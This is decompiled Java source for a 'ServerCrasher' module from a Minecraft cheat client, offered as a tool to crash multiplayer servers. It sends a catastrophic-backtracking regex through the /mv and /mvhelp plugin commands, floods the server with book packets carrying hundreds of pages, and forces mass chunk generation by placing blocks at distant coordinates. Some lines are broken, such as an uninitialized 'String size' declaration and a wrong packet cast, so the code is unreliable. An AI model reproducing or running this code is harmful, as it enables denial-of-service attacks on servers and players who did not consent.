/*
 * Decompiled with CFR 0.152.
 */
package tk.rektsky.module.impl.exploits;

import java.util.Random;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.network.play.server.S22PacketMultiBlockChange;
import net.minecraft.network.play.server.S23PacketBlockChange;
import net.minecraft.util.BlockPos;
import org.greenrobot.eventbus.Subscribe;
import tk.rektsky.Client;
import tk.rektsky.event.impl.PacketReceiveEvent;
import tk.rektsky.event.impl.WorldTickEvent;
import tk.rektsky.module.Category;
import tk.rektsky.module.Module;
import tk.rektsky.module.settings.ListSetting;

public class ServerCrasher
extends Module {
    public ListSetting mode = new ListSetting("Mode", new String[]{"/mv", "/mvhelp", "Custom", "Interact"}, "/mvhelp");
    int chunkGenerated = 0;

    public ServerCrasher() {
        super("ServerCrasher", "Crashes some servers (Some.)", Category.EXPLOIT, false);
    }

    @Override
    public void onEnable() {
        this.chunkGenerated = 0;
        if (this.mode.getValue().startsWith("/mv")) {
            this.rawSetToggled(false);
            String cmd = "/mv";
            if (this.mode.getValue().equals("/mvhelp")) {
                cmd = "/mvhelp";
            }
            this.mc.getNetHandler().addToSendQueueSilent(new C01PacketChatMessage(cmd + " ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*)$^"));
        } else {
            switch (this.mode.getValue()) {
                case "Custom": {
                    for (int i2 = 0; i2 < 50; ++i2) {
                        ItemStack book = new ItemStack(Items.writable_book);
                        String author = "Netty" + new Random().nextInt(50);
                        String size
                        NBTTagCompound tag = new NBTTagCompound();
                        NBTTagList list = new NBTTagList();
                        for (int i3 = 0; i3 < 340; ++i3) {
                            NBTTagString tString = new NBTTagString(size);
                            list.appendTag(tString);
                        }
                        tag.setString("author", author);
                        tag.setString("title", "");
                        tag.setTag("pages", list);
                        if (book.hasTagCompound()) {
                            NBTTagCompound tagb = book.getTagCompound();
                            tagb.setTag("pages", list);
                        } else {
                            book.setTagInfo("pages", list);
                        }
                        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 2.0, Minecraft.getMinecraft().thePlayer.posZ), 1, book, 0.0f, 0.0f, 0.0f));
                    }
                    break;
                }
            }
        }
    }

    @Subscribe
    public void onTick(WorldTickEvent event) {
        if (this.mc.thePlayer != null) {
            switch (this.mode.getValue()) {
                case "Interact": {
                    int spawnX = (int)(this.mc.theWorld.getWorldTime() % 2000L);
                    int spawnZ = (int)(this.mc.theWorld.getWorldTime() / 2000L);
                    this.mc.thePlayer.sendQueue.addToSendQueueSilent(new C08PacketPlayerBlockPlacement(new BlockPos(spawnX * 16, 70, spawnZ * -16), 0, this.mc.thePlayer.getCurrentEquippedItem(), 0.0f, 0.0f, 0.0f));
                }
            }
        }
    }

    @Subscribe
    public void onPacketRecv(PacketReceiveEvent event) {
        if (event.getPacket() instanceof S23PacketBlockChange) {
            event.setCanceled(true);
            ++this.chunkGenerated;
            BlockPos pos = ((S23PacketBlockChange)event.getPacket()).getBlockPosition();
            Client.addClientChat("Generated block at " + pos.getX() / 16 + " / " + pos.getZ() / 16 + "  (Generated: " + this.chunkGenerated + ")");
        }
        if (event.getPacket() instanceof S22PacketMultiBlockChange) {
            this.chunkGenerated += ((S22PacketMultiBlockChange)event.getPacket()).getChangedBlocks().length;
            Client.addClientChat("Generated " + this.chunkGenerated + " block(s) (Multi)! [" + ((S23PacketBlockChange)event.getPacket()).getBlockState().getBlock().getLocalizedName() + "]");
        }
    }
}

